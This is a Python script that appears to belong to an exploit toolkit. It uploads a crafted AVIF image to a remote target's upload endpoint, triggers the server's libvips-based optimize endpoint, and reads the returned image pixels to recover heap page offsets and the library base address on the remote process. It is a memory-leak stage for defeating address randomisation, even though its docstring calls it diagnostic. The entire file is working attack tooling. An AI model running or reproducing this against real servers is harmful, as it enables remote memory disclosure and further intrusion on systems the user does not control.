#!/usr/bin/env python3
"""Inspect late-record page lanes using only returned image pixels.

This is a diagnostic tool, not an exploit selector. The observed late record
did not reliably predict the allocation made by the following request, so its
output must not be promoted into a profile without separate layout evidence.
"""

from __future__ import annotations

import argparse
from dataclasses import replace
import json
from pathlib import Path
import sys
import uuid

sys.path.insert(0, str(Path(__file__).resolve().parents[1]))

from exploit import DONOR, optimize, upload
from heap_calibrator import analyze_heap_calibration
from profile_classifier import classify_libvips_profiles
from stack_profile import DEFAULT_MANIFEST, load_profile


def probe(target: str, manifest: Path, profile_id: str | None,
          attempts: int) -> dict[str, object]:
    profile = load_profile(profile_id, manifest)
    observations: list[dict[str, object]] = []
    for attempt in range(1, attempts + 1):
        name = f"lane-probe-{uuid.uuid4().hex}.avif"
        upload(
            target,
            DONOR,
            name,
            "image/avif",
            profile.application.upload_endpoint,
        )
        png, hints = optimize(
            target,
            name,
            profile.application.optimize_endpoint,
        )
        classification = classify_libvips_profiles(png, [profile], hints)
        selected_base = classification["selected_base"]
        result: dict[str, object] = {
            "attempt": attempt,
            "classification_status": classification["status"],
            "libvips_base": selected_base,
            "matching_lanes": [],
        }
        if isinstance(selected_base, str):
            base = int(selected_base, 0)
            matching_lanes = []
            for page_lane in range(0x1000, 0x10000, 0x1000):
                candidate = replace(
                    profile,
                    heap_calibration=replace(
                        profile.heap_calibration,
                        anchor_page_low16=page_lane,
                    ),
                )
                calibration = analyze_heap_calibration(png, candidate, base)
                if calibration["record_candidate_selectors"]:
                    matching_lanes.append({
                        "anchor_page_low16": hex(page_lane),
                        "derived_selectors": calibration[
                            "record_candidate_selectors"
                        ],
                        "matches": calibration["matches"],
                    })
            result["matching_lanes"] = matching_lanes
        observations.append(result)
        if result["matching_lanes"]:
            break
    return {
        "target": target,
        "reference_profile": profile.profile_id,
        "attempts": observations,
    }


def main() -> int:
    parser = argparse.ArgumentParser(
        description="Probe PIE heap page lanes from remote returned pixels",
    )
    parser.add_argument("--target", required=True)
    parser.add_argument("--manifest", type=Path, default=DEFAULT_MANIFEST)
    parser.add_argument("--profile")
    parser.add_argument("--attempts", type=int, default=64)
    parser.add_argument("--output", type=Path)
    args = parser.parse_args()
    if args.attempts < 1:
        parser.error("--attempts must be positive")
    result = probe(
        args.target.rstrip("/"), args.manifest, args.profile, args.attempts,
    )
    if args.output:
        args.output.write_text(
            json.dumps(result, indent=2, sort_keys=True) + "\n",
            encoding="utf-8",
        )
        matched = [
            attempt for attempt in result["attempts"]
            if attempt["matching_lanes"]
        ]
        print(json.dumps({
            "attempts": len(result["attempts"]),
            "match": matched[-1] if matched else None,
        }, indent=2, sort_keys=True))
    else:
        print(json.dumps(result, indent=2, sort_keys=True))
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
